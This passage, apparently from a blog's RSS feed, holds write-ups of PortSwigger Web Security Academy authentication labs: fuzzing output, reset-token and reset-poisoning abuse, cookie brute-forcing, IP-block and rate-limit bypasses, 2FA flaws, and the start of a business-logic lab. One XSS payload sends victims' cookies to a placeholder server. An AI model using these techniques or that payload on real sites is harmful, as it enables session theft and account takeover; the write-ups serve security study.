+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=as&amp;amp;password=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Proxy            : http://127.0.0.1:8080
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response status: 200
+________________________________________________
+
+2000                    [Status: 302, Size: 0, Words: 1, Lines: 1]
+:: Progress: [100/100] :: Job [1/1] :: 100 req/sec :: Duration: [0:00:01] :: Errors: 0 ::&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;hr&gt;
+&lt;h3&gt;Exploiting flawed logic in password reset&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;exploiting-flawed-logic-in-password-reset&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#exploiting-flawed-logic-in-password-reset&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Some applications may include a verification step in the password reset mechanism by sending an e-mail to the user that requested the reset. That link typically includes a token in the URL that allows the user to actually perform the password reset after clicking it. However, if the application does not assign that token to a specific user, it might be possible to use the token to reset the password of other users.&lt;/p&gt;
+&lt;p&gt;By following the first steps to reset our password, we get access to this page through a link sent to our e-mail account. On this page, we are able to enter the new password and intercept the request, so we can view and edit it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-1.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-2.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;By changing the value of the &lt;code&gt;username&lt;/code&gt; parameter to &lt;code&gt;carlos&lt;/code&gt;, we are able to reset Carlos’s password to the one we entered. Now it’s just a matter of logging into their account.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-3.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Brute-forcing a stay-logged-in cookie&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;brute-forcing-a-stay-logged-in-cookie&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#brute-forcing-a-stay-logged-in-cookie&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Most applications with authentication mechanisms include a small checkbox, usually labeled as “Remind me” or “Keep me logged in”, which allow the user not to lose their authenticated state after restoring the browser session.&lt;/p&gt;
+&lt;p&gt;Some of them do that by assigning a cookie to the user, which it will later read and use to consider the user authenticated.&lt;/p&gt;
+&lt;p&gt;If the cookie has a low-entropy value, as the encoding value of the concatenated account credentials, an attacker could try brute-forcing the value of that cookie, managing to gain access to the user’s account without even going through the authentication process.&lt;/p&gt;
+&lt;p&gt;In the example below, we already have a victim whose username is “carlos” and a list of candidate passwords. By analyzing the stay-logged-in cookie assigned to ourselves after we clicked the checkbox during the authentication of our own account, we’ve noticed that it consists in the base64 encoding of our username, followed with a coma and a MD5 hash, that translates to our password. With that in mind, we know that we basically need to hash our list of candidate passwords, add username and a comma to the beginning of each hash, and then encode each new line to base64 in order to perform our attack.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-4.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;For this case, we can use the presence of the “Update e-mail” button as an indicator that we’ve successfully logged in.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-5.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;ve also written a python exploit for this lab, which you can find &lt;a href=&#34;https://github.com/zetsuHQ/flash-scripts/blob/main/python/wordlist-encoder.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Stealing stay-logged-in cookie with XSS&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;stealing-stay-logged-in-cookie-with-xss&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#stealing-stay-logged-in-cookie-with-xss&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;XSS can also be used to stay session cookies from users. Sometimes we are able to inject an XSS payload that forwards the cookies of whoever accesses the page with injected scripts to a server under our control.&lt;/p&gt;
+&lt;p&gt;For that, we can write an HTML image tag like the following:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;img src=x onerror=this.src=&amp;quot;http://&amp;lt;YOUR_SERVER_IP&amp;gt;/?c=&amp;quot;+document.cookie&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This tag is basically injecting an image on the page with “x” as it’s source. As there’s no such path called “x”, the &lt;code&gt;onerror&lt;/code&gt; event will be triggered, causing the victim’s browser to look for the new image’s source in the provided URL. That URL is our web server. We are leading the victim’s browser to fetch the server with the “c” parameter having the value of &lt;code&gt;document.cookie&lt;/code&gt; (the victim&amp;rsquo;s cookies). Then we just need to access our server’s access log and look for the part where the cookie is located on each access. With that cookie in hand, we are able to either inject it into our browser to log-in the victim’s account or try cracking the hash to recover their actual password.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Password reset poisoning via middleware&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;password-reset-poisoning-via-middleware&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#password-reset-poisoning-via-middleware&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Some application generate dynamic URLs for the password reset feature. Those applications might be vulnerable to password reset poisoning via middleware.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-6.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;This is the password reset link sent by e-mail when submitting the password reset form, containing either the user’s username or e-mail.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;GET /forgot-password?temp-forgot-password-token=e7e5umk9suti5r2ddxfnybd78hnhk8pk HTTP/2
+Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;When clicking the link, this request is generated. It contains a token unique to the user. If we are able to modify the Host header for this request, we can set it to point to a server under our control.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-7.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;On the image above, we were able to intercept the form submission and set the X-Forwarded-Host value to our own server, besides setting “carlos” as the username. This request will generate a password reset link containing Carlos’s token and send it to us if he clicks it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-8.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;After a while, we checked our server’s access log and noticed that we have gotten a request containing the token as the value of a query parameter.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-9.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we were able to repeat our previous request (the one that happened when we clicked the reset link in our e-mail), but change the token’s value to Carlos’s. The response is a page were we are able to set the new password for Carlos’s account, then we are able to get full access to his account and probably to remove his own access.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Password brute-force via password change&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;password-brute-force-via-password-change&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#password-brute-force-via-password-change&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Some applications that contain password reset features fail to make the reset page inaccessible to unauthenticated users. If that’s the case, there’s a chance that the application is vulnerable to username enumeration or password brute-force.&lt;/p&gt;
+&lt;p&gt;In the image below, you can see that the application locks our account in case we provide the wrong current password, but it doesn’t lock it if we enter two different new passwords. We can take advantage of that, plus the fact that the username is provided in a hidden field in the POST request, in order to brute-force a password.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-10.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;We can set an attack targeting &lt;code&gt;carlos&lt;/code&gt;. Here we set two different passwords on the fields and set the part of the page containing the error message (Current password is incorrect) as our indicator. If the message changes, we have successfully figured out the victim’s password.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-11.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-12.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Here we can notice that the password “mobilemail” has passed the current password check and fell into the new password check. Now we can use it to get access to the victim’s account.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2&gt;Common obstacles&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;common-obstacles&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#common-obstacles&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are many options to protect an application from brute-force attacks, but if they’re implemented with flawed logic, the application might still be susceptible to this kind of attack.&lt;/p&gt;
+&lt;h3&gt;IP Block&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;ip-block&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#ip-block&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;An application may try to mitigate brute-force attacks by implementing an IP Block mechanism, which will basically disallow the user of making further login attempts after a certain number of failed submission of credentials based on their IP. The problems with that method arise when it accepts user input as a valid source for the user’s IP, such as the HTTP X-Forwarded-For header.&lt;/p&gt;
+&lt;h4&gt;Bypassing IP block with “X-Forwarded-For” header&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;bypassing-ip-block-with-x-forwarded-for-header&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#bypassing-ip-block-with-x-forwarded-for-header&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;The X-Forwarded-For header is used by the server in order to identify the original source of the request in case the client uses a proxy server. However, an attacker can manipulate this header in order to pretend that they are sending the request from a different IP. If the application accepts that header as a valid identifier of the user, it can be bypassed by attackers. This is a simple technique of &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/ip-spoofing/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;IP address spoofing&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;In order to bypass that kind of IP block, an attacker can set a different, made-up value for the X-Forwarded-For header for each attempt, As you can see on the Payload 1 column below.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-13.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h4&gt;Bypassing IP block with valid credentials&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;bypassing-ip-block-with-valid-credentials&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#bypassing-ip-block-with-valid-credentials&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;In some cases, the application might reset the counting of failed attempts if the attacker enter valid credentials, regardless the account. This way, an attacker might be able to bypass IP block by logging into their own account after every few attempts, allowing them to continue the attack.&lt;/p&gt;
+&lt;p&gt;In case the number of wrong attempts that triggers the IP blocker is three, the attacker’s wordlists could look like this:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;Username wordlist:
+1 &amp;lt;username1&amp;gt;
+2 &amp;lt;username2&amp;gt;
+3 &amp;lt;valid-username&amp;gt;
+4 &amp;lt;username3&amp;gt;
+5 &amp;lt;username4&amp;gt;
+6 &amp;lt;valid-username&amp;gt;
+7 ...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;Password wordlist:
+1 &amp;lt;password1&amp;gt;
+2 &amp;lt;password2&amp;gt;
+3 &amp;lt;valid-password&amp;gt;
+4 &amp;lt;password3&amp;gt;
+5 &amp;lt;password4&amp;gt;
+6 &amp;lt;valid-password&amp;gt;
+7 ...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;h3&gt;Rate limiting&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;rate-limiting&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#rate-limiting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;User rate limiting consists on the web application limiting the amount of requests a user can make on a specific range of time.&lt;/p&gt;
+&lt;h4&gt;Bypassing rate limit by sending multiple credentials in the same request&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;bypassing-rate-limit-by-sending-multiple-credentials-in-the-same-request&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#bypassing-rate-limit-by-sending-multiple-credentials-in-the-same-request&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;On the following example, the application uses a JSON object to receive the credentials, and the attacker is able to enter an array containing their password wordlist, so the application will try all the elements in the array until one of them logs the user in successfully. This is probably due to the back-end code not performing a kind of comparison that only works with strings. I would risk saying that the fact that it accepts an array as the value of &lt;code&gt;password&lt;/code&gt; is already wrong.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-14.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3&gt;Account locking&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;account-locking&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#account-locking&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Another common method for mitigation of brute-force attacks is to lock the account for which there might be the possibility of an ongoing attack, making it inaccessible for anyone trying to log-in to it for a certain amount of time, which makes the attack harder, as the attacker would need to wait until the lock’s timer ends in order to try a different password and proceed with the hack. However, if not handed properly, that method could lead to the disclosure of the account’s existence.&lt;/p&gt;
+&lt;h4&gt;Enumerating usernames with different response from account locking&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;enumerating-usernames-with-different-response-from-account-locking&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#enumerating-usernames-with-different-response-from-account-locking&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;It’s well-known that sending default and generic error messages is considered best practice when it comes to web security, and that principle is no different when it comes to account locking. If an application gives signs, such as a different error message, that it is blocking an account, that information can be used by attackers to enumerate existing accounts in the server.&lt;/p&gt;
+&lt;p&gt;On the following example, by repeating the authentication attempts five times for each username in the wordlist, the application sends a different error message for a specific user after the third guess, which in this case means that it has locked that specific user’s account in attempt to prevent a brute-force attack. That different error message is sufficient for the attacker to notice that the account exists in the database.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-15.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3&gt;2FA (two-factor authentication)&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;2fa-two-factor-authentication&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#2fa-two-factor-authentication&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Consists in using more then one single information (such as the password) in order to identify the an user’s authentication as valid.&lt;/p&gt;
+&lt;h4&gt;Bypassing front-end validated 2FA&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;bypassing-front-end-validated-2fa&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#bypassing-front-end-validated-2fa&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;On the case below, the application attempts implementing two-factor authentication, but does using it a flawed logic. It only does the validation on the application&amp;rsquo;s front-end. So, after successfully guessing the victim’s password, the attacker could simply try accessing other pages on the site and be already logged in, as the application has already set the session cookie to the attacker, considering them as authenticated.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-16.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-17.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-18.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h4&gt;Taking advantage from 2FA with flawed logic&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;taking-advantage-from-2fa-with-flawed-logic&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#taking-advantage-from-2fa-with-flawed-logic&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;In case the web server doesn’t verify that the user that submitted the first credentials and the one entering the 2FA code are the same, attacks might be possible.&lt;/p&gt;
+&lt;p&gt;On the example bellow, the web application doesn’t check if the user prompting for a 2FA code actually tried to log in, allowing us to generate a code without providing the user’s password, and then brute-force that code, managing to log into the victim’s account.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-19.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we can take our own 2FA code submission as sample to brute-force Carlos’s.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-21.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-22.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-23.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>Business Logic</title>
+      <link>http://localhost:1313/book/portswigger/business-logic/</link>
+      <pubDate>Mon, 19 Aug 2024 11:37:44 -0300</pubDate>
+      
+      <guid>http://localhost:1313/book/portswigger/business-logic/</guid>
+      <description>
+        
+        
+        &lt;p&gt;Business logic vulnerabilities are those that arise from the flawed assumption of the user’s behavior, failing to include the appropriate security mechanisms in the application’s logic and allowing attackers to take advantage of it.&lt;/p&gt;
+&lt;p&gt;There&amp;rsquo;s yet one lab from this topic that I didn&amp;rsquo;t complete: &lt;a href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Authentication bypass via encryption oracle&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I intend on doing this lab soon and publishing the solution here.&lt;/p&gt;
+&lt;h2&gt;Labs&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;labs&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#labs&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Excessive trust in client-side controls&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;excessive-trust-in-client-side-controls&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#excessive-trust-in-client-side-controls&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The following shopping application checks for the product’s value based on information included in the client side of the application, allowing attackers to craft and edit requests before they are sent do the server, and consequently purchasing products with arbitrary prices.&lt;/p&gt;
+&lt;p&gt;Original add to cart request:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /cart &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0aee00ab0420f09280afcb6f00450037.web-security-academy.net&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cookie&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;session=6ftRjffxKFYAX6oK6N1CJYwKcqNggNI4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cache-Control&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;max-age=0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt; &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua-Mobile&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;?0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua-Platform&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Origin&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;https://0aee00ab0420f09280afcb6f00450037.web-security-academy.net&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;application/x-www-form-urlencoded&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US,en;q=0.9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
